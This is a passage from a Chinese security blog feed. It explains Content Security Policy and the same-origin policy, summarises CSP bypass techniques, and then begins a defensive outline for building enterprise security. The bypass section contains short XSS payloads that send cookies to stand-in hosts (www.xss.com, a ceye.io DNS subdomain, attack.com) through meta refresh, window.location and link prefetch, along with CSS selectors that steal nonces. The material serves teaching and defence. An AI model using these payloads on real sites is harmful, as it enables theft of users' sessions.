script-src ‘self’; connect-src ‘self’; img-src ‘self’; style-src ‘self’;</code></li></ul></li></ul><ol><li>一个CSP头由多组CSP策略组成，中间由分号分隔,如下所示：<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Security</span>-<span class="title class_">Policy</span>: <span class="keyword">default</span>-src <span class="string">&#x27;self&#x27;</span> www.<span class="property">baidu</span>.<span class="property">com</span>; script-src <span class="string">&#x27;unsafe-inline&#x27;</span></span><br></pre></td></tr></table></figure></li></ol><ul><li><p>其中每一组策略包含一个策略指令和一个内容源列表。策略指令有如下选项：</p><table><thead><tr><th>指令</th><th>说明</th></tr></thead><tbody><tr><td>default-src</td><td>定义资源默认加载策略</td></tr><tr><td>connect-src</td><td>定义 Ajax、WebSocket 等加载策略</td></tr><tr><td>font-src</td><td>定义 Font 加载策略</td></tr><tr><td>frame-src</td><td>定义 Frame 加载策略</td></tr><tr><td>img-src</td><td>定义图片加载策略</td></tr><tr><td>media-src</td><td>定义 &lt;audio&gt;、&lt;video&gt; 等引用资源加载策略</td></tr><tr><td>object-src</td><td>定义 &lt;applet&gt;、&lt;embed&gt;、&lt;object&gt; 等引用资源加载策略</td></tr><tr><td>script-src</td><td>定义 JS 加载策略</td></tr><tr><td>style-src</td><td>定义 CSS 加载策略</td></tr><tr><td>sandbox</td><td>值为 allow-forms，对资源启用 sandbox</td></tr><tr><td>report-uri</td><td>值为 &#x2F;report-uri，提交日志</td></tr></tbody></table></li><li><p>内容源有如下选项：</p><table><thead><tr><th>源</th><th>说明</th></tr></thead><tbody><tr><td>*</td><td>通配符，允许任何URL，除了data: blob: filesystem: schemes</td></tr><tr><td>*.<a href="http://foo.com/">foo.com</a></td><td>允许加载<a href="http://foo.com/">foo.com</a>子域的资源</td></tr><tr><td><a href="http://abc.foo.com/">abc.foo.com</a></td><td>只能加载这个域名下的资源</td></tr><tr><td><a href="https://a.com/">https://a.com</a></td><td>只能用HTTPS加载域名下的资源</td></tr><tr><td>https:</td><td>通过HTTPS可以加载任意域名下的资源</td></tr><tr><td>‘none’</td><td>代表空集,即不匹配任何URL,两侧单引号是必须的</td></tr><tr><td>‘self’</td><td>代表和文档同源,包括相同的URL协议和端口号,两侧单引号是必须的</td></tr><tr><td>‘unsafe-inline’</td><td>允许使用内联资源,如内联的&lt;script&gt;元素、javascript: URL、内联的事件处理函数和内联的&lt;style&gt;元素,两侧单引号是必须的</td></tr><tr><td>‘unsafe-eval’</td><td>允许使用 eval() 等通过字符串创建代码的方法,两侧单引号是必须的</td></tr><tr><td>data:</td><td>允许data: URI作为内容来源</td></tr><tr><td>mediastream:</td><td>允许mediastream: URI作为内容来源</td></tr></tbody></table><ul><li><p>例子1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;self&#x27; trustedscripts.foo.com</span><br></pre></td></tr></table></figure><p>意思就是默认的内容源必须为同源或者是 <a href="http://trustedscripts.foo.com/">trustedscripts.foo.com</a></p><p>例子2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;; img-src &#x27;self&#x27; data:; media-src mediastream:</span><br></pre></td></tr></table></figure><p>图片源可以为同源内容或者是data:引用的资源，媒体源必须使用mediastream:引用，除此以外的都执行默认内容源判断，必须为同源内容。更加详细的可以看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lorexxar.cn/2016/08/08/ccsp/</span><br></pre></td></tr></table></figure><p>一个在线的CSP头部生成器可以帮助我们深入理解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cspisawesome.com</span><br></pre></td></tr></table></figure><p>一个CSP安全检测网站，能够提供一些参考</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://csp-evaluator.withgoogle.com/</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="CSP的进化–nonce-script-CSP和strict-dynamic"><a href="#CSP的进化–nonce-script-CSP和strict-dynamic" class="headerlink" title="CSP的进化–nonce script CSP和strict-dynamic"></a>CSP的进化–nonce script CSP和strict-dynamic</h3><p>这是Google团队2016年在<a href="https://static.googleusercontent.com/media/research.google.com/en//pubs/archive/45542.pdf">CSP is Dead, Long live CSP</a>中正式提出的CSP种类，为了解决CSP爆出的各种各样的问题。</p><h4 id="nonce-script-CSP"><a href="#nonce-script-CSP" class="headerlink" title="nonce script CSP"></a>nonce script CSP</h4><p>动态生成nonce字符串，只有包含nonce字段并字符串相等的script块可以被执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-Security-Policy: script-src &#x27;nonce-&quot;</span>.<span class="variable">$random</span>.<span class="string">&quot; &#x27;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;script nonce=<span class="string">&quot;&lt;?php echo <span class="subst">$random</span>?&gt;&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>这个字符串可以在后端实现，每次请求都重新生成，这样就可以无视哪个域是可信的，保证所加载的任何资源都是可信的，并且还能拦截后面插入的script。</p><h4 id="strict-dynamic"><a href="#strict-dynamic" class="headerlink" title="strict-dynamic"></a>strict-dynamic</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;; script-src &#x27;strict-dynamic&#x27;</span><br></pre></td></tr></table></figure><p><code>strict-dynamic</code>意味着可信js,生成的js代码是可信的。</p><p>这个CSP规则主要是用来适应各种各样的现代前端框架，通过这个规则，可以大幅度避免因为适应框架而变得松散的CSP规则。</p><h3 id="CSP-Bypass的方法总结"><a href="#CSP-Bypass的方法总结" class="headerlink" title="CSP Bypass的方法总结"></a>CSP Bypass的方法总结</h3><p>CSP对前端攻击的防御主要有两个：</p><ol><li>限制js的执行。</li><li>限制对不可信域的请求。</li></ol><p>接下来的多种Bypass手段也是围绕这两种的</p><h4 id="url跳转"><a href="#url跳转" class="headerlink" title="url跳转"></a>url跳转</h4><p>利用url跳转，回避严格的CSP。</p><p>在default-src ‘none’的情况下，可以使用meta标签实现跳转</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=http://www.xss.com/x.php?c=[cookie]&quot; &gt;</span><br></pre></td></tr></table></figure><p>在允许unsafe-inline的情况下，可以用window.location，或者window.open之类的方法进行跳转绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  window.location=&quot;http://www.xss.com/x.php?c=[cookie]&quot;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>&lt;a&gt;标签配合站内的某些可控JS点击操作来跳转</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  $(#foo).click()</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;a id=&quot;foo&quot; href=&quot;xxxxx.com&quot;&gt;</span><br></pre></td></tr></table></figure><p>利用网站本身的跳转接口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://foo.com/jmp.php?url=attack.com</span><br></pre></td></tr></table></figure><h4 id="lt-link-gt-标签预加载"><a href="#lt-link-gt-标签预加载" class="headerlink" title="&lt;link&gt;标签预加载"></a>&lt;link&gt;标签预加载</h4><p>CSP对link标签的预加载功能考虑不完善。在Chrome下，可以使用如下标签发送cookie或者其他数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;prefetch&quot; href=&quot;http://www.xss.com/x.php?c=[cookie]&quot;&gt;</span><br></pre></td></tr></table></figure><p>在Firefox下无法用prefetch，因为Firefox有更高的安全规范，但是我们可以使用其他的方式，比如dns-prefetch，将cookie作为子域名，用dns预解析的方式把cookie带出去，查看dns服务器的日志就能得到cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//[cookie].xxx.ceye.io&quot;&gt;</span><br></pre></td></tr></table></figure><p>link标签除了这两种rel，还有preconnect、prerender、subresource、preload等</p><h4 id="利用浏览器补全"><a href="#利用浏览器补全" class="headerlink" title="利用浏览器补全"></a>利用浏览器补全</h4><p>有些网站限制只有某些脚本才能使用，往往会使用&lt;script&gt;标签的nonce属性，只有nonce一致的脚本才生效，比如CSP设置成下面这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;none&#x27;;script-src &#x27;nonce-abc&#x27;</span><br></pre></td></tr></table></figure><p>那么当脚本插入点为如下的情况时</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;插入点&lt;/p&gt;</span><br><span class="line">&lt;script nonce=&quot;abc&quot;&gt;document.write(&#x27;CSP&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>可以插入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=//attack.com a=&quot;</span><br></pre></td></tr></table></figure><p>这里利用浏览器的容错机制会拼成一个新的script标签，其中的src可以自由设定</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;&lt;script src=//attack.com a=&quot;&lt;/p&gt;</span><br><span class="line">&lt;script&quot; nonce=&quot;abc&quot;&gt;document.write(&#x27;CSP&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="利用DOM-XSS"><a href="#利用DOM-XSS" class="headerlink" title="利用DOM XSS"></a>利用DOM XSS</h4><p>如果JS存在操作location.hash导致的XSS，那么这样的攻击请求不会经过后台，那么nonce后的随机值就不会刷新。可以见下面lorexxar师傅的博文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lorexxar.cn/2017/05/16/nonce-bypass-script/</span><br></pre></td></tr></table></figure><p>如果有DOM操作可以插入HTML并且可以控制插入的HTML内容，那么也可以绕过CSP</p><h4 id="利用CSS-静态xss-获取nonce值"><a href="#利用CSS-静态xss-获取nonce值" class="headerlink" title="利用CSS 静态xss 获取nonce值"></a>利用CSS 静态xss 获取nonce值</h4><p>利用CSS选择器来逐字节获取信息，<code>^=</code>从头部判断</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*[attribute^=&quot;a&quot;]&#123;background:url(&quot;record?match=a&quot;)&#125;</span><br><span class="line">*[attribute^=&quot;b&quot;]&#123;background:url(&quot;record?match=b&quot;)&#125;</span><br><span class="line">*[attribute^=&quot;c&quot;]&#123;background:url(&quot;record?match=c&quot;)&#125;</span><br></pre></td></tr></table></figure><p>比如确定第一位为c，那么就会继续下面的步骤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*[attribute^=&quot;ca&quot;]&#123;background:url(&quot;record?match=ca&quot;)&#125;</span><br><span class="line">*[attribute^=&quot;cb&quot;]&#123;background:url(&quot;record?match=cb&quot;)&#125;</span><br><span class="line">*[attribute^=&quot;cc&quot;]&#123;background:url(&quot;record?match=cc&quot;)&#125;</span><br></pre></td></tr></table></figure><p>由于是CSS的变化，没有引起服务器重新请求，所以nonce的值不会改变，偷取值后即可执行我们的script</p><h4 id="利用跨域传输数据"><a href="#利用跨域传输数据" class="headerlink" title="利用跨域传输数据"></a>利用跨域传输数据</h4><p>利用一些跨域传输的方法来引入JS，导致执行</p><p>具体的可以看看呆子不开口的乌云大会PPT</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://pan.baidu.com/s/1pLCfCWr</span><br></pre></td></tr></table></figure><p>和0CTF2018预选赛中的h4xors.club2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lorexxar.cn/2018/04/10/0ctf2018-club2/</span><br></pre></td></tr></table></figure><h4 id="利用文件上传执行JS"><a href="#利用文件上传执行JS" class="headerlink" title="利用文件上传执行JS"></a>利用文件上传执行JS</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;; script-src &#x27;self&#x27;</span><br></pre></td></tr></table></figure><p>针对只能加载同域下script的CSP策略，如果有上传点可以控制，那么可以在其中夹杂js代码，然后引用该文件完成执行。</p><p>可以参考前几天梅子酒师傅写的上传Wave文件绕过CSP，执行JS</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://mp.weixin.qq.com/s/ljBB5jStB7fcJq4cgdWnnw</span><br></pre></td></tr></table></figure><h4 id="base标签"><a href="#base标签" class="headerlink" title="base标签"></a>base标签</h4><p>利用base标签改变资源加载的域，从而引入恶意的js，造成js执行。</p><h2 id="同源策略-SOP"><a href="#同源策略-SOP" class="headerlink" title="同源策略(SOP)"></a>同源策略(SOP)</h2><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><p>SOP(Same-Origin-Policy)同源策略是浏览器的一个安全限制，它阻止了不同域之间进行的数据交互，A 网页设置的 Cookie，B 网页不能打开，除非这两个网页同源，所谓同源，是指：协议（protocol）、端口（port）、和主机（host）都相同，如果非同源，Cookie，LocalStorage，IndexDB 无法读取：</p><ol><li><p>LocalStorage</p><blockquote><p>LocalStorage 是 HTML5 本地存储 Web Storage 特性的 API 之一，用于将大量数据（最大 5 M）保存在浏览器中，保存后数据永远存在不会失效过期，除非用 Js 手动清除，它不参与网络传输，一般用于性能优化，可以保存图片、Js、CSS、HTML 模板、大量数据，IndexDB 也是用于储存的东西。</p></blockquote></li><li><p>DOM 无法获取</p><blockquote><p>DOM（Document Object Model）译为文档对象模型，是 HTML 和 XML 文档的编程接口，HTML DOM 定义了访问和操作 HTML 文档的标准方法，DOM 以树结构表达 HTML 文档。</p></blockquote></li><li><p>AJAX 请求不能发送</p><blockquote><p>AJAX &#x3D; Asynchronous JavaScript and XML（异步的 JavaScript 和 XML）。 AJAX 不是新的编程语言，而是一种使用现有标准的新方法。 AJAX 最大的优点是在不重新加载整个页面的情况下，可以与服务器交换数据并更新部分网页内容，AJAX 请求只能发给同源的网址。</p></blockquote></li></ol><h3 id="规避同源策略"><a href="#规避同源策略" class="headerlink" title="规避同源策略"></a>规避同源策略</h3><p>主要有以下三种方法规避同源策略的限制：<code>JSONP</code>，<code>WebSocket</code>，<code>CORS</code></p><h4 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h4><ul><li><a href="https://yinwc.github.io/2021/04/30/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JSONP%E6%BC%8F%E6%B4%9E/">深入理解JSONP漏洞</a></li><li>JSONP是JSON with padding（填充式JSON或参数式JSON）的简写。是为了解决跨域资源请求而产生的一种解决方案，动态创建<code>&lt;script&gt;</code>标签，然后利用<code>&lt;script&gt;</code>的<code>src</code>标签不受同源策略约束来跨域获取数据。</li></ul><h4 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h4><p>CORS是跨域资源共享<code>（Cross-Origin Resource Sharing）</code>的缩写，它允许浏览器向跨源服务器，发出XMLHttpRequest请求，从而克服了 AJAX 只能同源使用的限制，它是W3C标准，是跨源 AJAX 请求的根本解决方法.</p><ul><li>CORS请求大致和ajax请求类似，但是在 HTTP 头信息中加上了 Origin 字段表明请求来自哪个源，如果orgin是许可范围之内的话，服务器返回的响应会多出<code>Access-Control-Allow-*</code>的字段。</li></ul><h4 id="WebSocket"><a href="#WebSocket" class="headerlink" title="WebSocket"></a>WebSocket</h4><p>WebSocket是一种通信协议，使用<code>ws://</code>（非加密）和<code>wss://</code>（加密）作为协议前缀，该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信，为什么不实行同源策略？</p><ul><li>原因是WebSocket请求的头信息中有一个字段是Origin，表示该请求的请求源（origin），即发自哪个域名，正是因为有了Origin这个字段，所以WebSocket才没有实行同源政策，因为服务器可以根据这个字段，判断是否许可本次通信</li></ul><h5 id="CORS与JSONP的比较"><a href="#CORS与JSONP的比较" class="headerlink" title="CORS与JSONP的比较"></a>CORS与JSONP的比较</h5><p>CORS与JSONP的使用目的相同，但是比JSONP更强大，JSONP只支持 GET 请求，CORS支持所有类型的 HTTP 请求，JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://hurricane618.me/2018/06/30/csp-bypass-summary/">CSP绕过总结</a></li><li><a href="https://www.cnblogs.com/both-eyes/p/10841875.html">内容安全策略（CSP）详解</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- TOC --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#csp&quot;&gt;CSP&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#csp%E7%AE%80%E4%BB%8B&quot;&gt;CSP简介&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%8E%9F%E7%90%86&quot;&gt;原理&lt;/a</summary>
      
    
    
    
    
    <category term="前端安全" scheme="https://yinwc.github.io/tags/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>甲方安全建设</title>
    <link href="https://yinwc.github.io/2021/02/24/%E7%94%B2%E6%96%B9%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    <id>https://yinwc.github.io/2021/02/24/%E7%94%B2%E6%96%B9%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/</id>
    <published>2021-02-24T08:51:32.000Z</published>
    <updated>2023-01-29T02:55:16.328Z</updated>
    
    <content type="html"><![CDATA[<!-- TOC --><ul><li><a href="#%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4">基本步骤</a></li><li><a href="#%E7%BD%91%E7%BB%9C%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE">网络系统安全建设</a><ul><li><a href="#%E5%AE%89%E5%85%A8%E5%9F%9F%E5%88%92%E5%88%86">安全域划分</a></li><li><a href="#%E5%AE%89%E5%85%A8%E5%9F%9F%E9%A3%8E%E9%99%A9%E7%AD%89%E7%BA%A7">安全域风险等级</a></li><li><a href="#%E5%AE%89%E5%85%A8%E5%9F%9F%E9%A3%8E%E9%99%A9%E5%AF%B9%E8%B1%A1">安全域风险对象</a></li><li><a href="#%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE%E6%96%B9%E6%A1%88">安全建设方案</a><ul><li><a href="#%E5%8A%9E%E5%85%AC%E7%BD%91-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE">办公网-网络安全建设</a><ul><li><a href="#wifi%E5%AE%89%E5%85%A8">WIFI安全</a></li><li><a href="#vpn%E5%AE%89%E5%85%A8">VPN安全</a></li><li><a href="#%E6%97%A5%E5%BF%97%E6%B5%81%E9%87%8F%E9%87%87%E9%9B%86%E6%A3%80%E6%B5%8B">日志流量采集检测</a></li><li><a href="#router%E7%BB%9F%E4%B8%80%E7%AE%A1%E7%90%86">Router统一管理</a></li><li><a href="#%E7%BB%88%E7%AB%AF%E7%BD%91%E7%BB%9C%E5%87%86%E5%85%A5">终端网络准入</a></li><li><a href="#%E5%AE%89%E5%85%A8%E5%9F%9F%E4%B9%8B%E9%97%B4%E7%BD%91%E7%BB%9C%E9%9A%94%E7%A6%BB">安全域之间网络隔离</a></li></ul></li><li><a href="#%E5%8A%9E%E5%85%AC%E7%BD%91-%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE">办公网-系统安全建设</a><ul><li><a href="#%E5%8A%9E%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E5%85%A8">办公网服务器安全</a></li><li><a href="#%E5%8A%9E%E5%85%AC%E7%BD%91%E7%BB%88%E7%AB%AFpc%E5%AE%89%E5%85%A8">办公网终端PC安全</a></li></ul></li><li><a href="#%E5%8A%9E%E5%85%AC%E7%BD%91-%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE">办公网-应用安全建设</a><ul><li><a href="#sso%E7%BB%9F%E4%B8%80%E7%99%BB%E5%BD%95%E5%85%A5%E5%8F%A3">SSO统一登录入口</a></li><li><a href="#%E7%BD%91%E7%AB%99%E6%B0%B4%E5%8D%B0%E6%8A%80%E6%9C%AF">网站水印技术</a></li><li><a href="#%E9%82%AE%E7%AE%B1%E5%AE%89%E5%85%A8">邮箱安全</a></li><li><a href="#waf">WAF</a></li></ul></li><li><a href="#%E5%8A%9E%E5%85%AC%E7%BD%91-%E5%91%98%E5%B7%A5%E5%AE%89%E5%85%A8">办公网-员工安全</a><ul><li><a href="#%E5%9C%A8%E8%81%8C%E5%91%98%E5%B7%A5%E5%AE%89%E5%85%A8%E6%95%99%E8%82%B2">在职员工安全教育</a></li><li><a href="#%E7%A6%BB%E8%81%8C%E5%91%98%E5%B7%A5%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1">离职员工安全审计</a></li></ul></li><li><a href="#%E5%8A%9E%E5%85%AC%E7%BD%91-%E5%AE%89%E5%85%A8%E5%90%88%E8%A7%84">办公网-安全合规</a></li><li><a href="#%E7%94%9F%E4%BA%A7%E7%BD%91-%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE">生产网-系统安全建设</a></li><li><a href="#%E5%A4%96%E7%BD%91%E8%BE%B9%E7%95%8C%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE">外网边界安全建设</a></li><li><a href="#%E4%BA%A7%E5%93%81%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE">产品安全建设</a></li><li><a href="#%E4%BC%81%E4%B8%9A%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97">企业红蓝对抗</a></li><li><a href="#%E7%A7%81%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8">私有云安全</a></li><li><a href="#%E7%A7%81%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8">私有云安全</a></li><li><a href="#%E5%AE%89%E5%85%A8%E7%BB%84%E7%BB%87%E6%9E%B6%E6%9E%84">安全组织架构</a><ul><li><a href="#%E5%B0%8F%E8%A7%84%E6%A8%A1">小规模</a></li><li><a href="#%E5%A4%A7%E8%A7%84%E6%A8%A1">大规模</a></li></ul></li></ul></li></ul></li><li><a href="#%E5%85%B6%E4%BB%96">其他</a><ul><li><a href="#%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE%E5%BE%85%E5%AE%8C%E5%96%84">开源项目（待完善）</a></li><li><a href="#reference">Reference</a></li></ul></li></ul><!-- /TOC --><h1 id="基本步骤"><a href="#基本步骤" class="headerlink" title="基本步骤"></a>基本步骤</h1><p><strong>1. 资产梳理</strong></p><ul><li>IP列表、业务分组(负责人、联系方向)、业务属性</li><li>业务端口</li><li>业务应用架构、技术堆栈</li></ul><p><strong>2.边界安全，防火墙策略控制（需要梳理业务端口）</strong></p><ul><li>如果是硬件，使用防火墙统一控制</li><li>如果是操作系统，Iptalbes＋IPSEC</li><li>及时监控业务端口的变化（外部nmap扫描搜集结果比对，或者编写脚步放到运维平台收集系统监听端口和防火墙策略)</li><li>跳板机安全控制</li></ul><p><strong>3.账户安全管理</strong></p><ul><li>弱密码</li><li>root、sudoer权限</li><li>账户、授权、访问、审计等等</li></ul><p><strong>4.服务器安全</strong></p><ul><li>安全基线检测</li><li>操作审计</li><li>异常登录审计(日志收集分析)</li><li>漏洞清点&#x2F;扫描，补丁修复测试和推进</li></ul><p><strong>5.WEB安全</strong></p><ul><li>应用渗透测试</li><li>接口安全(加密、通信)</li><li>webshell实时监测</li><li>Nginx日志分析&#x2F;Nginx流量旁路分析</li></ul><p><strong>6.业务风控安全</strong></p><ul><li>用户安全机制（密码、验证码、登录）</li><li>交易安全</li></ul><p><strong>7.安全培训</strong></p><ul><li>安全意识培训</li><li>运维安全培训</li><li>WEB安全开发</li></ul><p><strong>8.安全规范和流程</strong></p><ul><li>人员入职账户开通</li><li>人员离职账户注销</li><li>服务器上下架安全管理</li><li>安全应急响应机制</li></ul><p><strong>9.内网安全</strong></p><ul><li>内网服务器安全</li><li>账户统一验证和管理机制(域ldap协议统一验证OA、RTX、邮件、内网业务系统)</li><li>弱口令监测(NTLM&#x2F;LM)</li><li>账户异常登录</li><li>网络隔离（物理／虚拟化）</li><li>网络准入</li><li>PC安全(病毒统一管理、通知处理)</li></ul><h1 id="网络系统安全建设"><a href="#网络系统安全建设" class="headerlink" title="网络系统安全建设"></a>网络系统安全建设</h1><h2 id="安全域划分"><a href="#安全域划分" class="headerlink" title="安全域划分"></a>安全域划分</h2><p>内部网络系统：主要指OA办公网内部、生产网内部、测试开发网内部、以及其他内部网络系统<br>外部网络系统：主要指OA办公网互联网边界、生产网互联网边界、测试开发网互联网边界、互联网上相关所属的网络系统（不限于：公有云、Github、云存储等）</p><h2 id="安全域风险等级"><a href="#安全域风险等级" class="headerlink" title="安全域风险等级"></a>安全域风险等级</h2><p>外部网络系统&gt;生产网内部网络系统&gt;测试开发网内部网络系统&gt;办公网内部网络系统&gt;其他网络系统</p><h2 id="安全域风险对象"><a href="#安全域风险对象" class="headerlink" title="安全域风险对象"></a>安全域风险对象</h2><p>外部系统：外部攻击者（黑客、白帽子）<br>内部系统：内部违规操作员工、已渗透到内网系统的外部攻击者</p><h2 id="安全建设方案"><a href="#安全建设方案" class="headerlink" title="安全建设方案"></a>安全建设方案</h2><p>由于不同安全域的风险等级、风险对象有所区别，因此我个人认为不同安全域的安全建设方案也该因地制宜。以下文章篇幅，我将根据不同安全域通过事前、事中、事后三个方面记录信息安全建设思路。</p><h3 id="办公网-网络安全建设"><a href="#办公网-网络安全建设" class="headerlink" title="办公网-网络安全建设"></a>办公网-网络安全建设</h3><h4 id="WIFI安全"><a href="#WIFI安全" class="headerlink" title="WIFI安全"></a>WIFI安全</h4><p>事前安全措施：1、建立双因素认证（通过个人账户密码+短信、动态密码）；2、建立设备安全认证（限定特定的设备才能连接）<br>事中安全措施：1、建议WIFI账号爆破监控；2、WIFI账号爆破封禁策略运营</p><h4 id="VPN安全"><a href="#VPN安全" class="headerlink" title="VPN安全"></a>VPN安全</h4><p>事前安全措施：1、远程接入公司内部网络进行双因素认证（个人账户密码+短信、动态密码）；2、硬件指纹获取识别<br>事中安全措施：1、VPN异地登录；2、异常登录监控；3、VPN爆破监控以及封禁策略<br>事后安全措施：1、联系VPN账号所属者确定攻击行为</p><h4 id="日志流量采集检测"><a href="#日志流量采集检测" class="headerlink" title="日志流量采集检测"></a>日志流量采集检测</h4><p>事前安全措施：1、办公网网络流量（到边界、到IDC）；2、日志采集检测<br>事中安全措施：1、员工异常行为监控（比如上传内部数据到网盘等）；2、攻击监控<br>事后安全措施：1、对涉事员工进行相应处罚</p><h4 id="Router统一管理"><a href="#Router统一管理" class="headerlink" title="Router统一管理"></a>Router统一管理</h4><p>事前安全措施：1、即统一管理内部网络映射到外网需求（可利用nginx反向代理），减少系统暴露风险<br>事中安全措施：1、外网端口扫描监控</p><h4 id="终端网络准入"><a href="#终端网络准入" class="headerlink" title="终端网络准入"></a>终端网络准入</h4><p>事前安全措施：1、办公终端（PC）需要安装准入程序，才允许上内部网络<br>事中安全措施：1、终端异常行为监控<br>事后安全措施：1、对涉事员工进行相应处罚</p><h4 id="安全域之间网络隔离"><a href="#安全域之间网络隔离" class="headerlink" title="安全域之间网络隔离"></a>安全域之间网络隔离</h4><p>例如：办公网与生产网之间只能通过堡垒机登录，且只有特定端口才能通信等策略（根据实际情况配置）</p><h3 id="办公网-系统安全建设"><a href="#办公网-系统安全建设" class="headerlink" title="办公网-系统安全建设"></a>办公网-系统安全建设</h3><h4 id="办公网服务器安全"><a href="#办公网服务器安全" class="headerlink" 